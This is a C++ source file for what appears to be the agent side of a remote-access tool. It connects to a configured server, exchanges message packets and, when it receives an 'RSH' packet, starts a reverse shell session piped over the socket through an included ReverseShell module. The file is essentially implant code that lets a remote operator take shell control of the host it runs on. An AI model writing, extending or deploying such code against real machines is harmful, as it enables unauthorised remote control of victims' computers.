#include <iostream>
#include <csignal>
#include "conn/AgentConn.h"
#include "protocol/SocketUtil.h"
#include "protocol/ProtocolDebug.h"
#include "remote_accsess/ReverseShell.h"
#include "protocol/PacketData.h"

AgentConn::AgentConn(const char *ip, int port) {
    agentSocketFD = createTCPIPv4Socket();
    serverAddress = createIPv4Address(ip, port);
    localAddress = createIPv4Address(agentSocketFD);
};

int AgentConn::main() {
    connectToServer();
    send();
    receive();
    return 0;
};

void AgentConn::connectToServer() {
    int result = connect(agentSocketFD, (sockaddr *) serverAddress, sizeof(struct sockaddr_in));
    if (result == 0) {
        Packet packet(AGENTCONNECT, localAddress, serverAddress);
        sendPacket(agentSocketFD, packet);
        printf("CONNECTED TO SERVER\n");
    } else {
        printf("ERRRO WHILE TRYING TO CONNECT TO SEVER %d\n", result);
        exit(1);
    }
};


void AgentConn::receive() {
    while (true) {
        Packet packet;
        int status = recvPacket(agentSocketFD, &packet);;
        if (status != 0) {
            printf("error while recvPacket %d", status);
            break;
        }
        handlePacket(packet);
    }
};

void AgentConn::handlePacket(Packet packet) {
    switch (packet.getType()) {
        case (MSG):
            handleMsg(packet);
            break;
        case (RSH):
            startRSHSessionPipe(agentSocketFD);
            break;
        default:
            printf("got undefiend packet: %d", packet.getType());
            break;
    }
}


void AgentConn::handleMsg(Packet packet) {
    switchPacketSrcDst(packet);
    sendPacket(agentSocketFD, packet);
    printf("sent to admin\n");
}



void AgentConn::send() {
    char msg[]{"hello from client :)"};
    MsgData msgData(msg);
    Packet p1(MSG, createIPv4Address(agentSocketFD), serverAddress, msgData.serialized(), msgData.dataLength);
    printf("sending packets\n");
    sendPacket(agentSocketFD, p1);

};